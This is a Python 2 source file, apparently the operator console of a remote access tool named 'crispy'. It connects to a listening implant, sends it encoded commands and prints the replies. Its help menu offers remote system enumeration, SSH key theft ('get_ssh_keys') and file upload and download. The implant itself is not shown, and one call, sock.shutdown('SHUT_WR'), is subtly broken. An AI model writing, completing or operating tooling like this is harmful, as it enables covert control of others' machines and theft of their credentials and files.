import socket
import sys

from crispy.encoders.mime import Mime

BUFFER_SIZE = 1024
TCP_IP, TCP_PORT = "localhost", 8080
PROMPT = "%s:%i>> " % (TCP_IP, TCP_PORT)
BANNER = "      ___           ___                       ___           ___      \n \
    /  /\         /  /\        ___          /  /\         /  /\         ___    \n \
   /  /:/        /  /::\      /  /\        /  /:/_       /  /::\      /__/|    \n \
  /  /:/        /  /:/\:\    /  /:/       /  /:/ /\     /  /:/\:\    |  |:|    \n \
 /  /:/  ___   /  /:/~/:/   /__/::\      /  /:/ /::\   /  /:/~/:/    |  |:|    \n \
/__/:/  /  /\ /__/:/ /:/___ \__\/\:\__  /__/:/ /:/\:\ /__/:/ /:/   __|__|:|    \n \
\  \:\ /  /:/ \  \:\/:::::/    \  \:\/\ \  \:\/:/~/:/ \  \:\/:/   /__/::::\    \n \
 \  \:\  /:/   \  \::/~~~~      \__\::/  \  \::/ /:/   \  \::/       ~\~~\:\   \n \
  \  \:\/:/     \  \:\          /__/:/    \__\/ /:/     \  \:\         \  \:\  \n \
   \  \::/       \  \:\         \__\/       /__/:/       \  \:\         \__\/  \n \
    \__\/         \__\/                     \__\/         \__\/                \n\n"
    
def help_menu():
    info = """
    Remote commands:
        enum_os            - get operating system info
        enum_applications  - get a list of installed applications
        enum_drives        - get a list of drives
        enum_printers      - get a list of printers
        get_ssh_keys       - get any ssh keys
        download           - download [src file] [dest path]
        upload             - upload [src file] [dest path]
    Local commands:
        session            - show current session
        exit               - close down connection to remote host
    """
     
    return info
 
def get_session_info():
    # show length of connection
    # show remote ip and port connected to
    return "need to implement once bind/reverse conn is figured out"

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
cipher = Mime()

try:
    sock.connect((TCP_IP, TCP_PORT))
    print BANNER
    
    while True:
        commandToExecute = raw_input(PROMPT).strip().lower()
         
        if commandToExecute == '-h' or commandToExecute == 'help':
            print help_menu()
            pass
        elif commandToExecute == 'session':
            print get_session_info()
            pass
        elif commandToExecute == 'exit' or commandToExecute == 'quit':
            sock.shutdown('SHUT_WR')
            sock.close()
            break
        else:
            sock.sendall(cipher.encode(commandToExecute + "\n"))
            data = cipher.decode(sock.recv(BUFFER_SIZE))
            print data
except:
    print "Couldn't connect to " + TCP_IP
finally:
    sys.exit(0)